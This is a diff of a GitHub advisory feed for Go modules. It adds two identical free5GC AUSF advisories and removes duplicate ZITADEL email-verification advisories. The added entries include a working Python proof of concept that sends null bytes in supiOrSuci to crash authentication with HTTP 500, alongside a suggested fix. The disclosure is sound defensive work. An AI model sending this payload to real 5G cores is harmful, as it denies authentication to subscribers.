@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
     <title>Security Advisory for Go modules</title>
-    <updated>2026-07-31T19:05:47.046Z</updated>
+    <updated>2026-07-31T20:51:43.972Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
     <subtitle>Security Advisory for Go modules on GitHub</subtitle>
@@ -11,6 +11,328 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[github.com/free5gc/ausf] free5GC AUSF: null byte injection in supiOrSuci causes HTTP 500 internal service failure]]></title>
+        <id>https://github.com/advisories/GHSA-qj55-47fp-p62j</id>
+        <link href="https://github.com/advisories/GHSA-qj55-47fp-p62j"/>
+        <updated>2026-07-31T20:13:14.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>The free5GC AUSF (Authentication Server Function) does not validate the <code>supiOrSuci</code> field in UE authentication requests. Null bytes (<code>\x00</code>) and other control characters pass through JSON parsing unchanged and are forwarded to the UDM in an unescaped URL path. This causes Go's <code>net/url.Parse()</code> to fail, returning HTTP 500 "System failure" and leaking internal stack traces. An unauthenticated attacker can trigger this at scale—4.1% of <code>special_chars</code> mutations produce HTTP 500—causing denial of service for all subscribers attempting authentication through the affected AUSF. CWE-20 (Improper Input Validation).</p>
+<hr>
+<h3 id="details">Details</h3>
+<p>The vulnerability lies in the AUSF's <code>POST /nausf-auth/v1/ue-authentications</code> handler. The JSON body includes a <code>supiOrSuci</code> field:</p>
+<pre><code class="language-json">{"supiOrSuci": "imsi-208930000000031", "servingNetworkName": "...", "authType": "5G_AKA"}
+</code></pre>
+<p>The AUSF parses this JSON (Go's <code>encoding/json</code> accepts null bytes in strings per RFC 8259), then constructs a UDM URL by directly embedding the raw <code>supiOrSuci</code> value:</p>
+<pre><code>GET /nudm-ueau/v1/{supiOrSuci}/security-information/...
+</code></pre>
+<p>When <code>supiOrSuci</code> contains null bytes (<code>\x00</code>), the resulting URL is illegal under RFC 3986. Go's <code>net/url.Parse()</code> fails, and the error propagates as an unhandled internal error, returning HTTP 500 with a stack trace in the response body:</p>
+<pre><code>{"error":{"status":"INTERNAL_SERVER_ERROR","message":"System failure"}}
+</code></pre>
+<p>The AUSF container log shows: <code>net/url: invalid control character in URL</code>.</p>
+<p><strong>Attack chain:</strong></p>
+<pre><code>1. Attacker → AUSF: POST {"supiOrSuci": "imsi-\x00...", ...}
+2. AUSF: JSON parsed OK (null bytes valid in JSON strings)
+3. AUSF → UDM: GET /nudm-ueau/v1/imsi-\x00.../security-information/...
+4. UDM: net/url.Parse() fails (\x00 illegal per RFC 3986)
+5. AUSF ← UDM: error
+6. Attacker ← AUSF: HTTP 500 {"message": "System failure"}
+</code></pre>
+<p><strong>Contrast with C/C++ 5GCs:</strong> The same null-byte injection in string fields causes SIGSEGV/SIGABRT in OAI (C++) and Open5GS (C), but "only" HTTP 500 in free5GC (Go). Go's memory safety converts the crash into a recoverable error—the service survives, but the denial is equally effective.</p>
+<p><strong>Discovery context:</strong> Found via automated 5G SBI fuzzing. The <code>special_chars</code> mutation strategy injected 10 consecutive null bytes into string-valued JSON fields. Across 24h of fuzzing:</p>
+<table>
+<thead>
+<tr>
+<th>Strategy</th>
+<th>Requests</th>
+<th>HTTP 500s</th>
+<th>Trigger Rate</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>special_chars</code></td>
+<td>98,304</td>
+<td>4,021</td>
+<td>4.1%</td>
+</tr>
+<tr>
+<td><code>seed_replay</code></td>
+<td>132,428</td>
+<td>7,947</td>
+<td>6.0%</td>
+</tr>
+<tr>
+<td><code>grammar_aware</code></td>
+<td>30,944</td>
+<td>683</td>
+<td>2.2%</td>
+</tr>
+</tbody></table>
+<p>100% of HTTP 500s originated from the <code>POST /nausf-auth/v1/ue-authentications</code> endpoint.</p>
+<h3 id="poc">PoC</h3>
+<p><strong>No configuration changes needed.</strong> Default free5GC deployment is vulnerable.</p>
+<pre><code class="language-python">#!/usr/bin/env python3
+import http.client, json
+
+AUSF_HOST = "127.0.0.1"   # Replace with AUSF IP (e.g. 172.24.0.50)
+AUSF_PORT = 8000
+
+# Bug: null bytes in supiOrSuci → HTTP 500
+body_bug = json.dumps({
+    "supiOrSuci": "imsi-\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
+    "servingNetworkName": "5G:mnc093.mcc208.3gppnetwork.org",
+    "authType": "5G_AKA"
+})
+
+conn = http.client.HTTPConnection(AUSF_HOST, AUSF_PORT, timeout=5)
+conn.request("POST", "/nausf-auth/v1/ue-authentications",
+             body=body_bug, headers={"Content-Type": "application/json"})
+resp = conn.getresponse()
+print(f"Bug:    Status {resp.status}")   # Returns 500
+
+# Contrast: normal SUCI → 404 (expected, UE not found)
+body_normal = json.dumps({
+    "supiOrSuci": "imsi-208930000000031",
+    "servingNetworkName": "5G:mnc093.mcc208.3gppnetwork.org",
+    "authType": "5G_AKA"
+})
+
+conn2 = http.client.HTTPConnection(AUSF_HOST, AUSF_PORT, timeout=5)
+conn2.request("POST", "/nausf-auth/v1/ue-authentications",
+              body=body_normal, headers={"Content-Type": "application/json"})
+resp2 = conn2.getresponse()
+print(f"Normal: Status {resp2.status}")  # Returns 404
+</code></pre>
+<p><strong>Run:</strong> <code>python3 reproduce.py</code></p>
+<p><strong>Expected fix (input validation + URL escaping):</strong></p>
+<pre><code class="language-go">import "regexp"
+import "net/url"
+
+var suciRegex = regexp.MustCompile(`^[a-zA-Z0-9\-]+$`)
+
+func validateSUCI(supiOrSuci string) error {
+    if strings.ContainsFunc(supiOrSuci, func(r rune) bool {
+        return r &lt; 0x20 || r &gt; 0x7e
+    }) {
+        return fmt.Errorf("SUCI contains illegal characters")
+    }
+    return nil
+}
+
+// URL-escape before constructing UDM request
+udmURL := fmt.Sprintf("http://%s/nudm-ueau/v1/%s/security-information/...",
+    udmAddr, url.PathEscape(supiOrSuci))
+</code></pre>
+<h3 id="impact">Impact</h3>
+<table>
+<thead>
+<tr>
+<th>Property</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>Authentication</strong></td>
+<td>None required (unauthenticated SBI endpoint)</td>
+</tr>
+<tr>
+<td><strong>Impact</strong></td>
+<td>Denial of Service — AUSF returns HTTP 500 for all authentication requests during attack</td>
+</tr>
+<tr>
+<td><strong>Information Leak</strong></td>
+<td>HTTP 500 response leaks internal <code>net/url.Parse</code> error, enabling backend fingerprinting</td>
+</tr>
+<tr>
+<td><strong>Affected version</strong></td>
+<td>free5GC v4.2.2 (latest)</td>
+</tr>
+<tr>
+<td><strong>Fix</strong></td>
+<td>Validate <code>supiOrSuci</code> before URL construction; use <code>url.PathEscape()</code></td>
+</tr>
+</tbody></table>
+<p><strong>Environment:</strong> Ubuntu 22.04, kernel 6.8.0-110, free5GC Docker containers on bridge network 172.24.0.0/16. NFs deployed: NRF, UDM, UDR, AUSF, AMF, SMF, PCF, NSSF, MongoDB.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/free5gc/free5gc/security/advisories/GHSA-qj55-47fp-p62j">https://github.com/free5gc/free5gc/security/advisories/GHSA-qj55-47fp-p62j</a></li>
+<li><a href="https://github.com/free5gc/free5gc/issues/1048">https://github.com/free5gc/free5gc/issues/1048</a></li>
+<li><a href="https://github.com/free5gc/ausf/pull/61">https://github.com/free5gc/ausf/pull/61</a></li>
+<li><a href="https://github.com/free5gc/ausf/commit/bfc4a10094dbacbd862baa4686829f3fcc06ce1e">https://github.com/free5gc/ausf/commit/bfc4a10094dbacbd862baa4686829f3fcc06ce1e</a></li>
+<li><a href="https://github.com/free5gc/ausf/releases/tag/v1.4.5">https://github.com/free5gc/ausf/releases/tag/v1.4.5</a></li>
+<li><a href="https://github.com/free5gc/free5gc/releases/tag/v4.2.2">https://github.com/free5gc/free5gc/releases/tag/v4.2.2</a></li>
+<li><a href="https://github.com/advisories/GHSA-qj55-47fp-p62j">https://github.com/advisories/GHSA-qj55-47fp-p62j</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-qj55-47fp-p62j</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-07-31T20:13:11.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/free5gc/free5gc] free5GC AUSF: null byte injection in supiOrSuci causes HTTP 500 internal service failure]]></title>
+        <id>https://github.com/advisories/GHSA-qj55-47fp-p62j</id>
+        <link href="https://github.com/advisories/GHSA-qj55-47fp-p62j"/>
+        <updated>2026-07-31T20:13:14.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>The free5GC AUSF (Authentication Server Function) does not validate the <code>supiOrSuci</code> field in UE authentication requests. Null bytes (<code>\x00</code>) and other control characters pass through JSON parsing unchanged and are forwarded to the UDM in an unescaped URL path. This causes Go's <code>net/url.Parse()</code> to fail, returning HTTP 500 "System failure" and leaking internal stack traces. An unauthenticated attacker can trigger this at scale—4.1% of <code>special_chars</code> mutations produce HTTP 500—causing denial of service for all subscribers attempting authentication through the affected AUSF. CWE-20 (Improper Input Validation).</p>
+<hr>
+<h3 id="details">Details</h3>
+<p>The vulnerability lies in the AUSF's <code>POST /nausf-auth/v1/ue-authentications</code> handler. The JSON body includes a <code>supiOrSuci</code> field:</p>
+<pre><code class="language-json">{"supiOrSuci": "imsi-208930000000031", "servingNetworkName": "...", "authType": "5G_AKA"}
+</code></pre>
+<p>The AUSF parses this JSON (Go's <code>encoding/json</code> accepts null bytes in strings per RFC 8259), then constructs a UDM URL by directly embedding the raw <code>supiOrSuci</code> value:</p>
+<pre><code>GET /nudm-ueau/v1/{supiOrSuci}/security-information/...
+</code></pre>
+<p>When <code>supiOrSuci</code> contains null bytes (<code>\x00</code>), the resulting URL is illegal under RFC 3986. Go's <code>net/url.Parse()</code> fails, and the error propagates as an unhandled internal error, returning HTTP 500 with a stack trace in the response body:</p>
+<pre><code>{"error":{"status":"INTERNAL_SERVER_ERROR","message":"System failure"}}
+</code></pre>
+<p>The AUSF container log shows: <code>net/url: invalid control character in URL</code>.</p>
+<p><strong>Attack chain:</strong></p>
+<pre><code>1. Attacker → AUSF: POST {"supiOrSuci": "imsi-\x00...", ...}
+2. AUSF: JSON parsed OK (null bytes valid in JSON strings)
+3. AUSF → UDM: GET /nudm-ueau/v1/imsi-\x00.../security-information/...
+4. UDM: net/url.Parse() fails (\x00 illegal per RFC 3986)
+5. AUSF ← UDM: error
+6. Attacker ← AUSF: HTTP 500 {"message": "System failure"}
+</code></pre>
+<p><strong>Contrast with C/C++ 5GCs:</strong> The same null-byte injection in string fields causes SIGSEGV/SIGABRT in OAI (C++) and Open5GS (C), but "only" HTTP 500 in free5GC (Go). Go's memory safety converts the crash into a recoverable error—the service survives, but the denial is equally effective.</p>
+<p><strong>Discovery context:</strong> Found via automated 5G SBI fuzzing. The <code>special_chars</code> mutation strategy injected 10 consecutive null bytes into string-valued JSON fields. Across 24h of fuzzing:</p>
+<table>
+<thead>
+<tr>
+<th>Strategy</th>
+<th>Requests</th>
+<th>HTTP 500s</th>
+<th>Trigger Rate</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>special_chars</code></td>
+<td>98,304</td>
+<td>4,021</td>
+<td>4.1%</td>
+</tr>
+<tr>
+<td><code>seed_replay</code></td>
+<td>132,428</td>
+<td>7,947</td>
+<td>6.0%</td>
+</tr>
+<tr>
+<td><code>grammar_aware</code></td>
+<td>30,944</td>
+<td>683</td>
+<td>2.2%</td>
+</tr>
+</tbody></table>
+<p>100% of HTTP 500s originated from the <code>POST /nausf-auth/v1/ue-authentications</code> endpoint.</p>
+<h3 id="poc">PoC</h3>
+<p><strong>No configuration changes needed.</strong> Default free5GC deployment is vulnerable.</p>
+<pre><code class="language-python">#!/usr/bin/env python3
+import http.client, json
+
+AUSF_HOST = "127.0.0.1"   # Replace with AUSF IP (e.g. 172.24.0.50)
+AUSF_PORT = 8000
+
+# Bug: null bytes in supiOrSuci → HTTP 500
+body_bug = json.dumps({
+    "supiOrSuci": "imsi-\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
+    "servingNetworkName": "5G:mnc093.mcc208.3gppnetwork.org",
+    "authType": "5G_AKA"
+})
+
+conn = http.client.HTTPConnection(AUSF_HOST, AUSF_PORT, timeout=5)
+conn.request("POST", "/nausf-auth/v1/ue-authentications",
+             body=body_bug, headers={"Content-Type": "application/json"})
+resp = conn.getresponse()
+print(f"Bug:    Status {resp.status}")   # Returns 500
+
+# Contrast: normal SUCI → 404 (expected, UE not found)
+body_normal = json.dumps({
+    "supiOrSuci": "imsi-208930000000031",
+    "servingNetworkName": "5G:mnc093.mcc208.3gppnetwork.org",
+    "authType": "5G_AKA"
+})
+
+conn2 = http.client.HTTPConnection(AUSF_HOST, AUSF_PORT, timeout=5)
+conn2.request("POST", "/nausf-auth/v1/ue-authentications",
+              body=body_normal, headers={"Content-Type": "application/json"})
+resp2 = conn2.getresponse()
+print(f"Normal: Status {resp2.status}")  # Returns 404
+</code></pre>
+<p><strong>Run:</strong> <code>python3 reproduce.py</code></p>
+<p><strong>Expected fix (input validation + URL escaping):</strong></p>
+<pre><code class="language-go">import "regexp"
+import "net/url"
+
+var suciRegex = regexp.MustCompile(`^[a-zA-Z0-9\-]+$`)
+
+func validateSUCI(supiOrSuci string) error {
+    if strings.ContainsFunc(supiOrSuci, func(r rune) bool {
+        return r &lt; 0x20 || r &gt; 0x7e
+    }) {
+        return fmt.Errorf("SUCI contains illegal characters")
+    }
+    return nil
+}
+
+// URL-escape before constructing UDM request
+udmURL := fmt.Sprintf("http://%s/nudm-ueau/v1/%s/security-information/...",
+    udmAddr, url.PathEscape(supiOrSuci))
+</code></pre>
+<h3 id="impact">Impact</h3>
+<table>
+<thead>
+<tr>
+<th>Property</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>Authentication</strong></td>
+<td>None required (unauthenticated SBI endpoint)</td>
+</tr>
+<tr>
+<td><strong>Impact</strong></td>
+<td>Denial of Service — AUSF returns HTTP 500 for all authentication requests during attack</td>
+</tr>
+<tr>
+<td><strong>Information Leak</strong></td>
+<td>HTTP 500 response leaks internal <code>net/url.Parse</code> error, enabling backend fingerprinting</td>
+</tr>
+<tr>
+<td><strong>Affected version</strong></td>
+<td>free5GC v4.2.2 (latest)</td>
+</tr>
+<tr>
+<td><strong>Fix</strong></td>
+<td>Validate <code>supiOrSuci</code> before URL construction; use <code>url.PathEscape()</code></td>
+</tr>
+</tbody></table>
+<p><strong>Environment:</strong> Ubuntu 22.04, kernel 6.8.0-110, free5GC Docker containers on bridge network 172.24.0.0/16. NFs deployed: NRF, UDM, UDR, AUSF, AMF, SMF, PCF, NSSF, MongoDB.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/free5gc/free5gc/security/advisories/GHSA-qj55-47fp-p62j">https://github.com/free5gc/free5gc/security/advisories/GHSA-qj55-47fp-p62j</a></li>
+<li><a href="https://github.com/free5gc/free5gc/issues/1048">https://github.com/free5gc/free5gc/issues/1048</a></li>
+<li><a href="https://github.com/free5gc/ausf/pull/61">https://github.com/free5gc/ausf/pull/61</a></li>
+<li><a href="https://github.com/free5gc/ausf/commit/bfc4a10094dbacbd862baa4686829f3fcc06ce1e">https://github.com/free5gc/ausf/commit/bfc4a10094dbacbd862baa4686829f3fcc06ce1e</a></li>
+<li><a href="https://github.com/free5gc/ausf/releases/tag/v1.4.5">https://github.com/free5gc/ausf/releases/tag/v1.4.5</a></li>
+<li><a href="https://github.com/free5gc/free5gc/releases/tag/v4.2.2">https://github.com/free5gc/free5gc/releases/tag/v4.2.2</a></li>
+<li><a href="https://github.com/advisories/GHSA-qj55-47fp-p62j">https://github.com/advisories/GHSA-qj55-47fp-p62j</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-qj55-47fp-p62j</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-07-31T20:13:11.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[github.com/bank-vaults/vault-secrets-webhook] vault-addr annotation SSRF -- webhook makes outbound HTTP call to attacker URL during admission; vault-serviceaccount enables cluster-wide SA token theft via TokenRequest API]]></title>
         <id>https://github.com/advisories/GHSA-r2v3-8gwf-7ghm</id>
@@ -1247,106 +1569,6 @@ spec:
         </author>
         <category label="severity" term="CRITICAL"/>
         <published>2026-07-29T17:01:29.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/zitadel/zitadel] ZITADEL Users Can Self-Verify Email/Phone via API]]></title>
-        <id>https://github.com/advisories/GHSA-jq8w-8q2f-ffm9</id>
-        <link href="https://github.com/advisories/GHSA-jq8w-8q2f-ffm9"/>
-        <updated>2026-07-29T16:54:53.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>A vulnerability in Zitadel's self-management capability allowed users to mark their email and phone as verified without going through an actual verification process.</p>
-<p>While <a href="https://github.com/zitadel/zitadel/security/advisories/GHSA-282g-fhmx-xf54"><code>GHSA-282g-fhmx-xf54</code></a> (CVE-2026-27946, "Users Can Self-Verify Email/Phone via UpdateHumanUser API") closed the path that let any authenticated user mark an arbitrary email or phone as verified on their own account by calling <code>UpdateHumanUser</code> with <code>email.is_verified: true</code>, additional paths were discovered.</p>
-<h3 id="impact">Impact</h3>
-<p>Zitadel provides an API for managing users. The API also allows users to self-manage their own data including updating the email and phone.</p>
-<p>Due to an improper permission check, the API allowed returning the verification code for the email and phone to the own user.
-This allows users to claim ownership of an email or phone they do not control and potentially bypass email-based security policies.</p>
-<p>Note that when changing another user's email or phone, regardless of the verification flag, the permissions were correctly checked.</p>
-<h3 id="affected-versions">Affected Versions</h3>
-<p>Systems running one of the following versions are affected:</p>
-<ul>
-<li><strong>4.x</strong>: <code>4.0.0</code> through <code>4.15.0</code> (including RC versions)</li>
-<li><strong>3.x</strong>: <code>3.0.0</code> through <code>3.4.10</code> (including RC versions)</li>
-<li><strong>2.x</strong>: <code>2.43.0</code> through <code>2.71.19</code></li>
-</ul>
-<h3 id="patches">Patches</h3>
-<p>The vulnerability has been addressed in the latest releases. The patch resolves the issue by requiring the correct permission in case the verification flag is provided and only allows self-management of the email address, resp. phone number itself.</p>
-<p>4.x: Upgrade to &gt;=<a href="https://github.com/zitadel/zitadel/releases/tag/v4.15.1">4.15.1</a>
-3.x: Update to &gt;=<a href="https://github.com/zitadel/zitadel/releases/tag/v3.4.11">3.4.11</a>
-2.x: Update to &gt;=<a href="https://github.com/zitadel/zitadel/releases/tag/v3.4.11">3.4.11</a></p>
-<h3 id="workarounds">Workarounds</h3>
-<p>The recommended solution is to upgrade to a patched version. If an upgrade is not possible, an action (v2) could be used to prevent returning the verification code to the own user.</p>
-<h3 id="questions">Questions</h3>
-<p>If you have any questions or comments about this advisory, please email us at <a href="mailto:security@zitadel.com">security@zitadel.com</a></p>
-<h3 id="credits">Credits</h3>
-<p>Thanks to <a href="https://github.com/eddieran">eddieran</a> for reporting this vulnerability.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/zitadel/zitadel/security/advisories/GHSA-jq8w-8q2f-ffm9">https://github.com/zitadel/zitadel/security/advisories/GHSA-jq8w-8q2f-ffm9</a></li>
-<li><a href="https://github.com/zitadel/zitadel/commit/90f310212d3a5075084a603bf61fed549c92956d">https://github.com/zitadel/zitadel/commit/90f310212d3a5075084a603bf61fed549c92956d</a></li>
-<li><a href="https://github.com/zitadel/zitadel/commit/a1748b2f0326ddf7be0de44b4f980ae2c07c0151">https://github.com/zitadel/zitadel/commit/a1748b2f0326ddf7be0de44b4f980ae2c07c0151</a></li>
-<li><a href="https://github.com/zitadel/zitadel/commit/ed09b3df7f43e870423e4d8f2757e6894481604f">https://github.com/zitadel/zitadel/commit/ed09b3df7f43e870423e4d8f2757e6894481604f</a></li>
-<li><a href="https://github.com/zitadel/zitadel/releases/tag/v3.4.11">https://github.com/zitadel/zitadel/releases/tag/v3.4.11</a></li>
-<li><a href="https://github.com/zitadel/zitadel/releases/tag/v4.15.1">https://github.com/zitadel/zitadel/releases/tag/v4.15.1</a></li>
-<li><a href="https://github.com/advisories/GHSA-jq8w-8q2f-ffm9">https://github.com/advisories/GHSA-jq8w-8q2f-ffm9</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-jq8w-8q2f-ffm9</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-07-29T16:54:49.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/zitadel/zitadel] ZITADEL Users Can Self-Verify Email/Phone via API]]></title>
-        <id>https://github.com/advisories/GHSA-jq8w-8q2f-ffm9</id>
-        <link href="https://github.com/advisories/GHSA-jq8w-8q2f-ffm9"/>
-        <updated>2026-07-29T16:54:53.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>A vulnerability in Zitadel's self-management capability allowed users to mark their email and phone as verified without going through an actual verification process.</p>
-<p>While <a href="https://github.com/zitadel/zitadel/security/advisories/GHSA-282g-fhmx-xf54"><code>GHSA-282g-fhmx-xf54</code></a> (CVE-2026-27946, "Users Can Self-Verify Email/Phone via UpdateHumanUser API") closed the path that let any authenticated user mark an arbitrary email or phone as verified on their own account by calling <code>UpdateHumanUser</code> with <code>email.is_verified: true</code>, additional paths were discovered.</p>
-<h3 id="impact">Impact</h3>
-<p>Zitadel provides an API for managing users. The API also allows users to self-manage their own data including updating the email and phone.</p>
-<p>Due to an improper permission check, the API allowed returning the verification code for the email and phone to the own user.
-This allows users to claim ownership of an email or phone they do not control and potentially bypass email-based security policies.</p>
-<p>Note that when changing another user's email or phone, regardless of the verification flag, the permissions were correctly checked.</p>
-<h3 id="affected-versions">Affected Versions</h3>
-<p>Systems running one of the following versions are affected:</p>
-<ul>
-<li><strong>4.x</strong>: <code>4.0.0</code> through <code>4.15.0</code> (including RC versions)</li>
-<li><strong>3.x</strong>: <code>3.0.0</code> through <code>3.4.10</code> (including RC versions)</li>
-<li><strong>2.x</strong>: <code>2.43.0</code> through <code>2.71.19</code></li>
-</ul>
-<h3 id="patches">Patches</h3>
-<p>The vulnerability has been addressed in the latest releases. The patch resolves the issue by requiring the correct permission in case the verification flag is provided and only allows self-management of the email address, resp. phone number itself.</p>
-<p>4.x: Upgrade to &gt;=<a href="https://github.com/zitadel/zitadel/releases/tag/v4.15.1">4.15.1</a>
-3.x: Update to &gt;=<a href="https://github.com/zitadel/zitadel/releases/tag/v3.4.11">3.4.11</a>
-2.x: Update to &gt;=<a href="https://github.com/zitadel/zitadel/releases/tag/v3.4.11">3.4.11</a></p>
-<h3 id="workarounds">Workarounds</h3>
-<p>The recommended solution is to upgrade to a patched version. If an upgrade is not possible, an action (v2) could be used to prevent returning the verification code to the own user.</p>
-<h3 id="questions">Questions</h3>
-<p>If you have any questions or comments about this advisory, please email us at <a href="mailto:security@zitadel.com">security@zitadel.com</a></p>
-<h3 id="credits">Credits</h3>
-<p>Thanks to <a href="https://github.com/eddieran">eddieran</a> for reporting this vulnerability.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/zitadel/zitadel/security/advisories/GHSA-jq8w-8q2f-ffm9">https://github.com/zitadel/zitadel/security/advisories/GHSA-jq8w-8q2f-ffm9</a></li>
-<li><a href="https://github.com/zitadel/zitadel/commit/90f310212d3a5075084a603bf61fed549c92956d">https://github.com/zitadel/zitadel/commit/90f310212d3a5075084a603bf61fed549c92956d</a></li>
-<li><a href="https://github.com/zitadel/zitadel/commit/a1748b2f0326ddf7be0de44b4f980ae2c07c0151">https://github.com/zitadel/zitadel/commit/a1748b2f0326ddf7be0de44b4f980ae2c07c0151</a></li>
-<li><a href="https://github.com/zitadel/zitadel/commit/ed09b3df7f43e870423e4d8f2757e6894481604f">https://github.com/zitadel/zitadel/commit/ed09b3df7f43e870423e4d8f2757e6894481604f</a></li>
-<li><a href="https://github.com/zitadel/zitadel/releases/tag/v3.4.11">https://github.com/zitadel/zitadel/releases/tag/v3.4.11</a></li>
-<li><a href="https://github.com/zitadel/zitadel/releases/tag/v4.15.1">https://github.com/zitadel/zitadel/releases/tag/v4.15.1</a></li>
-<li><a href="https://github.com/advisories/GHSA-jq8w-8q2f-ffm9">https://github.com/advisories/GHSA-jq8w-8q2f-ffm9</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-jq8w-8q2f-ffm9</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-07-29T16:54:49.000Z</published>
     </entry>
     <entry>
         <title type="html"><![CDATA[[github.com/zitadel/zitadel] ZITADEL Users Can Self-Verify Email/Phone via API]]></title>
